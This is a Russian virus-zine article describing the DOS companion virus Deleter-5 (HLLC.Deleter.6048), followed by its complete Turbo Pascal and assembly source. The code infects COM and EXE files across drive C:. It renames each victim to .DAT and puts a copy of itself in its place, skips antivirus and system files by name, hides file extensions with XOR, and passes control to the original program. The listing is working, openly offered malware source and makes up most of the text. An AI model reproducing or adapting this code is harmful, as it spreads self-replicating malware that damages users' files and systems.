          
 █│█│█▀█│█▄▄ ▀┘▀█▀┘█▀█│▀█▀┘  █│█│  Паскаль! Как много в этом звуке!
 █▀█│█▀█│█▄█│█│ █│ █▀█│ █│   ▀▀█│                   by  Аноноимный Вася
─────────────────────────────────

     Вирус прост до безобразия. Но если кто чего не понимает -- читайте
дальше, и вы всё узнаете. Для начала -- вирус называется Deleter-5  или
HLLC.Deleter.6048, причём названию своему  не  соответствует,  так  как
ничего не удаляет.
     Вир перехватывает прерывание 24h, чтоб воспользоваться  DOS'овским
обработчиком ошибок, затем копирует себя в буфер. И начинает  заражение
COM'ов и EXE'шников по всему диску.  Сначала  он  проверяет  жертву  на
принадлежность к PE/NE и на заражённость,  если  подозрение  правильно,
переходит к обработке следующего файла. Потом проверяет  имя  файла  на
список имён, заражать которые мне бы не  хотелось.  Если  файл  чист  и
девственнен, вирус переименовывает его в ИМЯ_ЖЕРТВЫ.DAT, а  сам  стано-
вится ИМЯ_ЖЕРТВЫ.РАСШИРЕНИЕ_ЖЕРТВЫ. После заражежения он  дописывает  к
себе какое-то число байт (чтоб в одной директории не было кучи файлов с
одной и той же длиной (хотя кто на  неё  сейчас  смотрит?!))  и  ставит
метку, которой служит число B0BA. Максимальное число  жертв,  как  COM,
так и EXE, равно трём.
     После процесса заражения  вирус  ищет  файл  СВОЁ_ИМЯ.DAT,  if  не
находит его, сообщает об этом и заканчивает работу, else узнаёт  полную
командную строку (не теми извращенческими способами, которые встречают-
ся в большинстве Pascal-вирусов), отдаёт память и запускает, не  переи-
меновывая в EXE.
     Всё, конец!
     В вирусе используются исходники by Duke/SMF & Dima Orlov. 

===============[Кут хере]================================================
{$M 10000, 1000, 90000}
{$S-,I-,G+}

USES DOS;
CONST VirSize = 6048;                        { Размер вируса }
      FName : Array[1..21] of String[8] = (
              'DOS4GW','AIDSTEST','SCANDISK','FIND','FDISK',
              'DELTREE','DEBUG','CHKDSK','EMM386','NC','NCMAIN',
              'SMARTDRV','MOVE','IBMBIO','IBMDOS','DN','WIN','COMMAND',
              'FORMAT','SYS','DRWEB386');    { Неприкосновенные файлы }
VAR ds          : DirStr;                    { Директория }
    ns          : NameStr;                   { Имя файла }
    es          : ExtStr;                    { Расширение }
    a           : File;                      { Файл }
    dat,exe,com : String[4];                 { Расширения }
    vir         : Array[1..VirSize] of Char; { Буфер под вирус }
    zh          : Integer;                   { Счётчик жертв }
{----------------------------------------------------------------------------}
PROCEDURE SetMemTop(MemTop:Pointer); assembler;
ASM
        MOV     BX,MemTop.Word[0]
        ADD     BX,15
        MOV     CL,4
        SHR     BX,CL
        ADD     BX,MemTop.Word[2]
        MOV     AX,PrefixSeg
        SUB     BX,AX
        MOV     ES,AX
        MOV     AH,4Ah
        INT     21h
        JMP     @VKA
        DB      '[Deleter-5]'          { Название вируса }
        @VKA:
END;
{----------------------------------------------------------------------------}
FUNCTION Xorer(st:String):String;
VAR j : Integer;
    o : String;
  Begin
    o := '';
    for j := 1 to length(st) do o:=o+chr(ord(st[j]) xor (j+1) div 2);
    Xorer := o;
end;
{----------------------------------------------------------------------------}
PROCEDURE PrintStr(S:string); Assembler;
ASM
        PUSH    DS
        LDS     SI,S
        CLD
        LODSB
        XOR     AH,AH
        XCHG    AX,CX                  { CX = Len( S ) }
        MOV     AH,40h
        MOV     BX,1
        MOV     DX,SI
        INT     21h
        POP     DS
END;
{----------------------------------------------------------------------------}
PROCEDURE Infect(st:String);           { Заражение }
VAR i   : Integer;
    ch  : Char;
    pe  : Byte;
    str : Word;                        { Метка вируса }
  Begin
    if zh = 3 then Exit;               { Если заражено три файла -- выход }

    Assign(a,st);
    SetfAttr(a,$20);
    Reset(a,1);                        { Открываем файл }
    Seek(a,24);
    BlockRead(a,pe,1);                 { Пытаемся определить, MZ или PE/NE }
    Seek(a,FileSize(a)-2);
    BlockRead(a,str,2);                { Проверим на заражение }
    Close(a);

    if pe = $40 then Exit;             { Если PE/NE -- на выход }
    if str = $BAB0 then Exit;          { Если файл заражён -- на выход }

    FSplit(st,ds,ns,es);               { Режем имя жертвы на куски }
    
    for i := 1 to 23 do if ns = FName[i] then Exit;
    
    Rename(a,ds+ns+dat);               { Переименуем жертву в .DAT }
    if es = com then                   { Если это COM... }
      Assign(a,ds+ns+com)              { ... переименуемся в COM }
    else                               { Если это EXE... }
      Assign(a,ds+ns+exe);             { ... переименуемся в EXE }
    ReWrite(a,1);

    BlockWrite(a,vir,VirSize);         { Запишем вирус }
      for i := 1 to Random(12345) do   { Добавим к копии вируса RND байтов }
        Begin
          ch := Chr(Random(250));
          BlockWrite(a,ch,1);
        End;
    str := $BAB0;                      { Метка вируса -- B0BA }
    BlockWrite(a,str,2);               { Поставим метку }
    Close(a);
    zh := zh + 1;                      { Счётчик жертв }
    End;
{----------------------------------------------------------------------------}
PROCEDURE FileFind(Dir,FindName:PathStr);
  Procedure SearchDir(Dir:PathStr);
  VAR SRec : SearchRec;
    Begin
      if Dir[Length(Dir)] <> '\' then Dir := Dir+'\';
      FindFirst(Dir + FindName, AnyFile, SRec);
      While DosError = 0 do
        Begin
          with SRec do
           if Attr and (VolumeID + Directory) = 0 then
           Infect(Dir+Name);           { Заражаем жертву }
           FindNext(SRec);
        End;
      FindFirst(Dir+'*.*', Directory or ReadOnly or Hidden or SysFile, SRec);
        while DosError = 0 do
          begin
            with SRec do
              if (Attr and Directory <> 0) and (Name[1] <> '.') then
              SearchDir(Dir+Name);
            FindNext(SRec);
          End;
      End;
  Begin
    SearchDir(Dir);
  End;
{----------------------------------------------------------------------------}
{----------------------------------------------------------------------------}
{----------------------------------------------------------------------------}
VAR k           : ^String;             { Командная строка }
    n           : SearchRec;           { Для поиска жертв }
    virname     : String;              { Имя файла с вирусом }
BEGIN
  SetIntVec($24,SaveInt24);

  dat := Xorer('/ECV');                { .DAT }
  exe := Xorer('/DZG');                { .EXE }
  com := Xorer('/BMO');                { .COM }

  virname := ParamStr(0);              { Находим своё имя }
  FSplit(virname,ds,ns,es);            { Режем его на куски }
  virname := ns;                       { Наше имя без расширения }

  Assign(a,ParamStr(0));               { Находим себя }
  Reset(a,1);                          { Открываем себя }
  Seek(a,0);
  BlockRead(a,vir,VirSize);            { Однако, копируем себя в буфер }
  Close(a);                            { Закрываем себя }

  FileFind('C:\','*'+com);             { Заражаем COM }
  zh := 0;                             { Обнуляем счётчик жертв }
  FileFind('C:\','*'+exe);             { Заражаем EXE }

  Findfirst(virname+dat,$21,n);        { Поиск жертвы }
    if DosError <> 0 then              { Если не найдена, скажем об этом }
      Begin
        PrintStr('No more file(s): '+virname+dat);
        Halt;                          { Выход из программы }
     End;

  k := Ptr(PrefixSeg,$80);             { Узнаем полную командную строку }
  SetMemTop(HeapPtr);                  { Отдадим память }
  Exec(virname+dat,k^);                { Запускаем DAT-файл! ;] }
  SetMemTop(HeapEnd);                  { Заберём память }
END.
===============[Кут хере]================================================









